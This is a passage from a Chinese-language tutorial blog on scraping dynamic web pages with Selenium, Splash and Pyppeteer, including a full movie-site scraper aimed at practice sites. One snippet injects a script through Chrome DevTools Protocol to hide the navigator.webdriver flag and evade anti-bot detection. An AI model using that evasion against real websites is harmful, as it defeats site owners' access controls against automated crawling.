class="line">    browser.get(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> TimeoutException:</span><br><span class="line">    print(<span class="string">&#x27;Time out&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.find_element((By.ID, <span class="string">&#x27;hello&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> NoSuchElementException:</span><br><span class="line">    print(<span class="string">&#x27;No Element&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.close()</span><br></pre></td></tr></table></figure><p>现在很多网站都增加了对 Selenium 的屏蔽，防止一些爬虫的恶意爬取。大多数情况下，检测的基本原理是检测当前浏览器窗口下的 <code>window.navigator</code> 对象中是否有 <code>webdriver</code> 属性，正常使用时应该是 <code>undefined</code>。另外，执行 JS 语句来置空属性也不行，因为 <code>execute_script</code> 是在页面加载完成后运行的，如下图：</p><p><img data-src="https://s2.loli.net/2022/02/25/RLk7uOWFAdp3gt4.png"></p><p>Selenium 中可以用 CDP(Chrome Devtools Protocol)，利用它可以在页面刚加载的时候执行 JS，执行的 CDP 方法是 <code>Page.addScriptToEvaluateOnNewDocument</code>，另外还可加入几个选项来隐藏 WebDriver 提示条和自动化扩展信息，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ChromeOptions</span><br><span class="line"></span><br><span class="line">option = ChromeOptions()</span><br><span class="line">option.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-auutomation&#x27;</span>])</span><br><span class="line">option.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">browser = webdriver.Chrome(options=option)</span><br><span class="line">browser.execute_cdp_cmd(<span class="string">&#x27;Page.addScriptToEvaluateOnNewDocument&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;source&#x27;</span>: <span class="string">&#x27;Object.defineProperty(navigator, &quot;webdriver&quot;, &#123;get: () =&gt; undefined&#125;)&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">browser.get(<span class="string">&#x27;https://antispider1.scrape.center/&#x27;</span>)</span><br></pre></td></tr></table></figure><p>无头模式，网站在运行的时候不会弹窗，减少了干扰，也减少了一些资源（如图片）的加载，在一定程度上节省了资源加载的时间和网络带宽</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ChromeOptions</span><br><span class="line"></span><br><span class="line">option = ChromeOptions()</span><br><span class="line">option.add_argument(<span class="string">&#x27;--headless&#x27;</span>)  <span class="comment"># 无头模式参数</span></span><br><span class="line">browser = webdriver.Chrome(options=option)</span><br><span class="line">browser.set_window_size(<span class="number">1366</span>, <span class="number">768</span>)  <span class="comment"># 设置窗口大小</span></span><br><span class="line">browser.get(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)</span><br><span class="line">browser.get_screenshot_as_file(<span class="string">&#x27;preview.png&#x27;</span>)  <span class="comment"># 输出网页截图</span></span><br></pre></td></tr></table></figure><p>来实战爬取开始的示例网站，要完成的主要工作：</p><ul><li>通过 Selenium 遍历网页，获取每部电影的详情页 URL；</li><li>通过 Selenium 爬取每个详情页；</li><li>从详情页获取每部电影的名称、类别、分数、简介、封面等内容；</li><li>数据存储</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> makedirs</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> exists</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO,</span><br><span class="line">                    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s: %(message)s&#x27;</span>)</span><br><span class="line">INDEX_URL = <span class="string">&#x27;https://spa2.scrape.center/page/&#123;page&#125;&#x27;</span></span><br><span class="line">TIME_OUT = <span class="number">10</span></span><br><span class="line">TOTAL_PAGE = <span class="number">1</span></span><br><span class="line">RESULTS_DIR = <span class="string">&#x27;results&#x27;</span></span><br><span class="line"></span><br><span class="line">exists(RESULTS_DIR) <span class="keyword">or</span> makedirs(RESULTS_DIR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 设置无头模式</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">wait = WebDriverWait(browser, TIME_OUT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scrape_page</span>(<span class="params">url, condition, locator</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通用爬取方法</span></span><br><span class="line"><span class="string">    :param url: 列表页 URL</span></span><br><span class="line"><span class="string">    :param condition: 页面加载成功的判断条件</span></span><br><span class="line"><span class="string">    :param locator: 定位器，配置查询条件和参数来获得一个或多个节点</span></span><br><span class="line"><span class="string">    :return: WebElement</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    logging.info(<span class="string">&#x27;scraping %s&#x27;</span>, url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.get(url)</span><br><span class="line">        wait.until(condition(locator))</span><br><span class="line">    <span class="keyword">except</span> TimeoutException:</span><br><span class="line">        logging.error(<span class="string">&#x27;error occurred while scraping %s&#x27;</span>, url, exc_info=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scrape_index</span>(<span class="params">page</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    列表页爬取</span></span><br><span class="line"><span class="string">    :param page: 页码</span></span><br><span class="line"><span class="string">    :return: WebElement</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    url = INDEX_URL.<span class="built_in">format</span>(page=page)</span><br><span class="line">    scrape_page(url, condition=EC.visibility_of_all_elements_located,</span><br><span class="line">                locator=(By.CSS_SELECTOR, <span class="string">&#x27;#index .item&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_index</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    解析页面</span></span><br><span class="line"><span class="string">    :return: 详情页 URL</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    elements = browser.find_elements(By.CSS_SELECTOR, <span class="string">&#x27;#index .item .name&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">        href = element.get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">        <span class="keyword">yield</span> urljoin(INDEX_URL, href)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scrape_detail</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    详情页爬取</span></span><br><span class="line"><span class="string">    :param url: 详情页 URL</span></span><br><span class="line"><span class="string">    :return: WebElement</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    scrape_page(url, condition=EC.visibility_of_element_located, locator=(By.TAG_NAME, <span class="string">&#x27;h2&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    详情页解析</span></span><br><span class="line"><span class="string">    :return: dict</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    url = browser.current_url</span><br><span class="line">    name = browser.find_element(By.TAG_NAME, <span class="string">&#x27;h2&#x27;</span>).text</span><br><span class="line">    categories = [element.text <span class="keyword">for</span> element <span class="keyword">in</span> browser.find_elements(By.CSS_SELECTOR, <span class="string">&#x27;.categories button span&#x27;</span>)]</span><br><span class="line">    cover = browser.find_element(By.CLASS_NAME, <span class="string">&#x27;cover&#x27;</span>).get_attribute(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">    score = browser.find_element(By.CLASS_NAME, <span class="string">&#x27;score&#x27;</span>).text</span><br><span class="line">    drama = browser.find_element(By.CSS_SELECTOR, <span class="string">&#x27;.drama p&#x27;</span>).text</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;categories&#x27;</span>: categories,</span><br><span class="line">        <span class="string">&#x27;cover&#x27;</span>: cover,</span><br><span class="line">        <span class="string">&#x27;score&#x27;</span>: score,</span><br><span class="line">        <span class="string">&#x27;drama&#x27;</span>: drama</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    保存数据</span></span><br><span class="line"><span class="string">    :param data: dict</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    name = data.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    data_path = <span class="string">f&#x27;<span class="subst">&#123;RESULTS_DIR&#125;</span>/<span class="subst">&#123;name&#125;</span>.json&#x27;</span></span><br><span class="line">    json.dump(data, <span class="built_in">open</span>(data_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>), ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, TOTAL_PAGE + <span class="number">1</span>):</span><br><span class="line">            scrape_index(page)</span><br><span class="line">            detail_urls = parse_index()</span><br><span class="line">            <span class="comment"># logging.info(&#x27;detail_urls |%s&#x27;, list(detail_urls))</span></span><br><span class="line">            <span class="keyword">for</span> detail_url <span class="keyword">in</span> <span class="built_in">list</span>(detail_urls):</span><br><span class="line">                logging.info(<span class="string">&#x27;get detail url %s&#x27;</span>, detail_url)</span><br><span class="line">                scrape_detail(detail_url)</span><br><span class="line">                detail_data = parse_detail()</span><br><span class="line">                logging.info(<span class="string">&#x27;detail data %s&#x27;</span>, detail_data)</span><br><span class="line">                save_data(detail_data)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Splash-的使用"><a href="#Splash-的使用" class="headerlink" title="Splash 的使用"></a>Splash 的使用</h3><p>建议通过 Docker 安装，安装命令为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run <span class="literal">-p</span> <span class="number">8050</span>:<span class="number">8050</span> scrapinghub/splash</span><br><span class="line"><span class="comment"># 加 -d 参数以守护态启动，中断远程服务器连接后不会终止服务运行</span></span><br></pre></td></tr></table></figure><p>启动后在浏览器输入 <code>http://localhost:8050/</code> ，可看到如下页面：</p><img data-src="https://s2.loli.net/2022/02/28/wHSbBJF3mfKsVyN.png" style="zoom: 80%;" /><p>在右上方输入框中输入连接，如<code>https://www.baidu.com</code>，点击<code>Render me!</code>开始渲染。</p><img data-src="https://s2.loli.net/2022/02/28/oAzHShjb9e46kDQ.png" style="zoom: 80%;" /><p>在页面中可以看到脚本代码，是用 Lua 编写的，返回了 html 源代码、页面截图和 HAR 信息。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">(splash, args)</span></span></span><br><span class="line">  <span class="built_in">assert</span>(splash:go(args.url))</span><br><span class="line">  <span class="built_in">assert</span>(splash:wait(<span class="number">0.5</span>))</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    html = splash:html(),</span><br><span class="line">    png = splash:png(),</span><br><span class="line">    har = splash:har(),</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>main 方法中第一个参数为 splash，类似于 Selenium 的 WebDriver，splash 对象的<strong>属性</strong>有：</p><ul><li><strong>args</strong>：用于获取页面加载时配置的参数，支持设置 main 方法的第二个参数为 args；</li><li><strong>js_enabled</strong>：Splash 执行 JS 代码的开关，默认 true；</li><li><strong>resource_timeout</strong>：超时时间，单位秒，设置 0 或 nil 代表不检测超时；</li><li><strong>images_enabled</strong>：设置是否加载图片，默认 true，禁用该属性可节省网络流量提高加载速度，但也因此会影响 DOM 节点的位置，当 JavaScript 对图片节点执行操作时就会收到影响。另外，Splash 会使用缓存，禁用属性后仍会加载出之前的网页图片，重启 Splash 解决；</li><li><strong>plugins_enable</strong>：控制是否开启浏览器插件（Flash 等），默认 false；</li><li><strong>scroll_positon</strong>：控制页面上下左右滚动，如 <code>splash.scroll_positon = &#123;y=400&#125;</code>，表示向下滚动 400 像素。</li></ul><p>splash 对象的<strong>方法</strong>有：</p><ul><li><p><strong>go</strong></p><p><code>ok, reason = splash:go&#123;url, baseurl=nil, headers=nil, http_method=“GET”, body=nil, formdata=nil&#125;</code></p><ul><li>body：http_method 为 POST 时的表单数据，使用的 Content-type 为 application/json；</li><li>formdata：http_method 为 POST 时的表单数据，使用的 Content-type 为 application/x-www-form-urlencoded；</li></ul></li><li><p><strong>wait</strong></p><p><code>ok, reason = splash:wait&#123;time, cancel_on_redirect=false, cancel_on_error=true&#125;</code></p><ul><li>time：等待的时间，单位秒；</li><li>cancel_on_redirect：如果页面重定向则停止等待；</li><li>cancel_on_error：页面加载错误则停止等待。</li></ul></li><li><p><strong>jsfunc</strong></p><p>用于直接调用 JS 方法，需要用双中括号包裹调用的方法，相当于 JS 方法到 Lua 脚本的转变</p><p><code>local git_div_count = splash:jsfunc([[function () &#123;return document.body.getElementsByTagName(&#39;div&#39;);&#125;]])</code></p></li><li><p><strong>evaljs</strong></p><p>用于执行 JS 代码并返回最后一条 JS 语句的返回结果</p><p><code>reslt = splash:evaljs(“document.title”)</code></p></li><li><p><strong>runjs</strong></p><p>与 evaljs 类似，但偏向于执行某些动作或声明某些方法</p><p><code>splash:runjs(&quot;foo = function () &#123;return &#39;bar&#39;&#125;&quot;)</code></p></li><li><p><strong>html</strong></p><p>用于获取网页源代码</p></li><li><p><strong>png/jpeg</strong></p><p>用于获取 PNG/JPEG 格式的网页截图</p></li><li><p><strong>har</strong></p><p>用于获取页面加载过程的描述信息</p></li><li><p><strong>url</strong></p><p>用于获取当前访问的 url</p></li><li><p><strong>set_user_agent</strong></p><p>用于设置浏览器的 User-Agent</p></li><li><p><strong>select/select_all</strong></p><p>用于选中符合条件的第一个节点/所有节点</p></li><li><p><strong>mouse_click</strong></p><p>用于模拟鼠标的点击操作，参数为坐标值 x、y，也可以选中某个节点后直接调用</p></li></ul><p>Splash 提供了一些 HTTP API，结合 Python 使用示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># render.html, render.har </span></span><br><span class="line">url = <span class="string">&#x27;http://localhost:8050/render.html?url=https://www.baidu.com&amp;wait=5&#x27;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># render.png, render.jpeg</span></span><br><span class="line">url = <span class="string">&#x27;http://localhost:8050/render.png?url=https://www.jd.com/&amp;wait=5&amp;width=1000&amp;height=700&#x27;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jd.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(response.content)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># render.json </span></span><br><span class="line"><span class="comment"># 包含前面所有 render 相关 API，可以通过从传入不同参数控制返回结果，如链接后加上 %html=1%har=1，会返回相应结果</span></span><br><span class="line">url = <span class="string">&#x27;http://localhost:8050/render.json?url=https://www.httpbin.org&#x27;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">print(response.text)</span><br><span class="line">-------</span><br><span class="line">result&gt;&gt; &#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.httpbin.org/&quot;</span>, <span class="string">&quot;requestedUrl&quot;</span>: <span class="string">&quot;https://www.httpbin.org/&quot;</span>, <span class="string">&quot;geometry&quot;</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1024</span>, <span class="number">768</span>], <span class="string">&quot;title&quot;</span>: <span class="string">&quot;httpbin.org&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute 实现与 Lua 脚本对接</span></span><br><span class="line"><span class="comment"># 将 lua 脚本进行 url 编码后拼接到 execute 也可执行相应代码</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">lua = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">function main(splash, args)</span></span><br><span class="line"><span class="string">    local treat = require(&quot;treat&quot;)</span></span><br><span class="line"><span class="string">    local response = splash:http_get(&quot;http://www.httpbin.org/get&quot;)</span></span><br><span class="line"><span class="string">    return &#123;html=treat.as_string(response.body),</span></span><br><span class="line"><span class="string">        url=response.url,</span></span><br><span class="line"><span class="string">        status=response.status</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost:8050/execute?lua_source=&#x27;</span> + quote(lua)</span><br><span class="line">print(url)</span><br><span class="line">response = requests.get(url)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>用 Splash 爬取页面时，如果数据流非常大，任务非常多，可以考虑搭建一个负载均衡器将压力分散到多个服务器上，减小单个 Splash 服务的压力。</p><p>有了 Splash，可以将 JavaScript 动态渲染的操作完全托管到服务器上，爬虫爬取时不需要依赖 Selenium 等库，业务逻辑会更加轻量级。</p><h3 id="Pyppeteer-的使用"><a href="#Pyppeteer-的使用" class="headerlink" title="Pyppeteer 的使用"></a>Pyppeteer 的使用</h3><p>Selenium 虽然强大，配置较为复杂，需要安装浏览器、驱动，还需安装对应版本的 Python Selenium 库，如果要大规模部署 Selenium 的话，一些环境配置问题也是需要考虑的。由此，我们学习一个 Selenium 的替代品，Pyppeteer，它是 Google 基于 Node.js 开发的一个工具，背后使用了 Chromium 浏览器来进行网页渲染。另外，它是基于 async 实现的，一些操作支持异步方式，相比 Selenium 效率更高。</p><p>安装命令 <code>pip install pyppeteer</code>，安装完后可以执行<code>pyppeteer-install</code>完成一些初始化操作，这会下载一个 Chromium 浏览器并配置好环境变量，不执行则会再第一次运行时自动初始化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本使用</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch()  <span class="comment"># 启动浏览器</span></span><br><span class="line">    page = <span class="keyword">await</span> browser.newPage()  <span class="comment"># 新建选项卡</span></span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">&#x27;https://spa2.scrape.center/&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> page.waitForSelector(<span class="string">&#x27;.item .name&#x27;</span>)  <span class="comment"># 等待选择器对应节点加载完成</span></span><br><span class="line">    doc = pq(<span class="keyword">await</span> page.content())</span><br><span class="line">    names = [item.text() <span class="keyword">for</span> item <span class="keyword">in</span> doc(<span class="string">&#x27;.item .name&#x27;</span>).items()]</span><br><span class="line">    print(<span class="string">&#x27;Names:&#x27;</span>, names)</span><br><span class="line">    <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure><p>详细文档，可查看 <a href="https://pyppeteer.github.io/pyppeteer/">Pyppeteer’s documentation</a></p><p>launch 方法详解</p><ul><li>ignoreHTTPSErrors：是否忽略 HTTPS 的错误，默认 False；</li><li>headless：是否启用无头模式，如果 devtools 设为 True，该参数就会设为 False，否则为 True</li><li>executablePath：可执行文件的路径，可指定已存在的 Chrome 或 Chromium，无需使用默认的 Chromium</li><li>slowMo：通过传入指定的时间，可减缓 Pyppeteer 的一些模糊操作</li><li>args(int|str)：执行过程中可传入的额外参数</li><li>ignoreDefaultArgs：是否忽略 Pyppeterer 的默认参数，如果使用，最好设置一些 args，否则可能会有问题</li><li>handleSIGINT：是否响应 SIGINT 信号，即是否可以用 Ctrl + C 终止程序，默认 True</li><li>handleSIGTERM：是否响应 SIGTERM 信号（一般是 kill 命令），默认 True</li><li>handleSIGHUP：是否响应 SIGHUP 信号，即挂起信号，例如终端退出操作，默认是 True</li><li>dumpio：是否将 Pyppeteer 的输出内容传给 process.stdout 对象和 process.stderr 对象，默认 False</li><li> userDatadir：用户数据文件夹，可保留一些个性化配置和操作记录</li><li>env：环境变量，可以传入字典形式的数据</li><li>devtools：是否自动为每一个页面开启调试工具，默认 False</li><li>logLevel(int|str)：日志级别，默认和 root logger 对象的级别相同</li><li>autoclose：当一些命令执行完后，是否自动关闭浏览器，默认 True</li><li>loop(asynciio.AbstractEventLoop)：时间循环对象</li></ul><p>Page 对象详解</p><ul><li><code>J</code> 方法对应 <code>querySelector()</code>，<code>JJ</code> 方法对应 <code>querySelectorAll()</code>；</li><li><code>bringToFront() </code>可以切换选项卡；</li><li><code>click() </code>模拟点击操作，第一个参数为选择器，第二个 <code>options=&#123;button，clickCount，delay&#125;</code>，button 表示鼠标按钮，有 left，middle，right，clickCount 表示点击次数，delay 表示延迟；</li><li><code>cookies()</code> 获取 Cookies</li><li><code>evaluate()</code> 执行 JavaScript 语句，<code>page.evaluate(&#39;&#39;&#39;() =&gt; &#123; return &#39;test&#39; &#125;&#39;&#39;&#39;)</code></li></ul><p>延迟等待方法，除了示例代码的 <code>waitForSelector</code>，还有 <code>waitForFunction, waitForNavigation, waitForRequest, waitForResponse, waitFor, waitForXPath</code></p><p>实战爬取 Selenium 那节的示例网站，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 